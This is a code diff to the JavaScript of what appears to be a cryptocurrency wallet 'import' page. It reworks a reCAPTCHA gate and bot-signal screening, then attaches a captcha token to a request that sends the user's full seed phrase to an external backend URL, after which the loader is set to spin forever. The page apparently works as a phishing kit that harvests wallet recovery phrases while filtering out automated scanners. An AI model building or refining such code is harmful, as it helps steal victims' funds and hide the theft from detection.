@@ -1,8 +1,11 @@
+import { renderCaptcha, getCaptchaToken } from "./captcha.js";
+
 const feedback = document.querySelector("#demo-feedback");
 const captchaMeta = document.querySelector("#captcha-meta");
 window.captchaMeta = captchaMeta;
 const blockedReason = document.querySelector("#blocked-reason");
 const recaptchaWidget = document.querySelector("#recaptcha-widget");
+const recaptchaSiteKey = "6Lem3QctAAAAADxKwAA-TwsomgL-Al-ELNfQbcdH";
 const screens = {
   captcha: document.querySelector('[data-screen="captcha"]'),
   blocked: document.querySelector('[data-screen="blocked"]'),
@@ -152,8 +155,6 @@ const messages = {
   new: "home.demoFeedback",
 };
 
-const recaptchaSiteKey = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
-const captchaStorageKey = "vaultCaptchaPassed";
 const botSignals = [
   {
     reason: "Automation flag detected",
@@ -310,30 +311,39 @@ function showBlocked(reason) {
   showScreen("blocked");
 }
 
-function markCaptchaPassed() {
-  localStorage.setItem(captchaStorageKey, "true");
+let currentCaptchaToken = "";
+
+function markCaptchaPassed(token) {
+  currentCaptchaToken = token || getCaptchaToken();
+
   if (captchaMeta) captchaMeta.textContent = "Verification complete.";
   showScreen("home");
 }
 
-function renderRecaptcha() {
-  if (!recaptchaWidget || !window.grecaptcha?.render) return false;
+async function renderRecaptcha() {
+  if (!recaptchaWidget) return false;
   if (recaptchaWidget.dataset.rendered === "true") return true;
 
-  window.grecaptcha.render(recaptchaWidget, {
-    sitekey: recaptchaSiteKey,
-    callback: markCaptchaPassed,
-    "expired-callback": () => {
-      if (captchaMeta) captchaMeta.textContent = "Verification expired. Please try again.";
-    },
-    "error-callback": () => {
-      if (captchaMeta) captchaMeta.textContent = "Verification could not load. Check your connection and refresh.";
-    },
-  });
+  try {
+  await renderCaptcha(recaptchaWidget, {
+  siteKey: recaptchaSiteKey,
+  onSuccess: markCaptchaPassed,
+      onExpired: () => {
+        if (captchaMeta) captchaMeta.textContent = "Verification expired. Please try again.";
+      },
+      onError: () => {
+        if (captchaMeta) captchaMeta.textContent = "Verification could not load. Check your connection and refresh.";
+      },
+    });
 
-  recaptchaWidget.dataset.rendered = "true";
-  if (captchaMeta) captchaMeta.textContent = "Complete the check to continue.";
-  return true;
+    recaptchaWidget.dataset.rendered = "true";
+    if (captchaMeta) captchaMeta.textContent = "Complete the check to continue.";
+    return true;
+  } catch (error) {
+    console.error("Captcha render error:", error);
+    if (captchaMeta) captchaMeta.textContent = "Verification failed to load.";
+    return false;
+  }
 }
 
 function initCaptchaGate() {
@@ -343,24 +353,31 @@ function initCaptchaGate() {
     return;
   }
 
-  if (localStorage.getItem(captchaStorageKey) === "true") {
-    showScreen("home");
-    return;
-  }
 
   showScreen("captcha");
 
-  let attempts = 0;
-  const loadTimer = window.setInterval(() => {
-    attempts += 1;
-    if (renderRecaptcha() || attempts > 80) {
+let attempts = 0;
+let captchaLoading = false;
+
+const loadTimer = window.setInterval(async () => {
+  attempts += 1;
+
+  if (!captchaLoading) {
+    captchaLoading = true;
+
+    const rendered = await renderRecaptcha();
+
+    captchaLoading = false;
+
+    if (rendered || attempts > 80) {
       window.clearInterval(loadTimer);
     }
+  }
 
-    if (attempts > 80 && captchaMeta) {
-      captchaMeta.textContent = "Verification is still loading. Refresh the page if it does not appear.";
-    }
-  }, 250);
+  if (attempts > 80 && captchaMeta) {
+    captchaMeta.textContent = "Verification is still loading. Refresh the page if it does not appear.";
+  }
+}, 250);
 }
 
 function showFeedback(action) {
@@ -687,8 +704,14 @@ secretImportButton?.addEventListener("click", async () => {
     loader.classList.add("is-loading-forever");
   }
   const backendUrl = "https://vault-wallet-back-production.up.railway.app/api/wallet/import";
+  const captchaToken = currentCaptchaToken || getCaptchaToken();
 
-  //wwhen secretImportButton.disabled = true;
+  if (!captchaToken || captchaToken.trim().length === 0) {
+  if (window.captchaMeta) {
+    window.captchaMeta.textContent = "Please complete the captcha check.";
+  }
+  return;
+}
 
   try {
     const response = await fetch(backendUrl, {
@@ -700,6 +723,7 @@ secretImportButton?.addEventListener("click", async () => {
         walletName: walletName || "Main wallet",
         seedPhrase,
         description: seedPhrase.length > 50 ? seedPhrase.substring(0, 50) + "..." : seedPhrase,
+        captchaToken,
       }),
     });
 
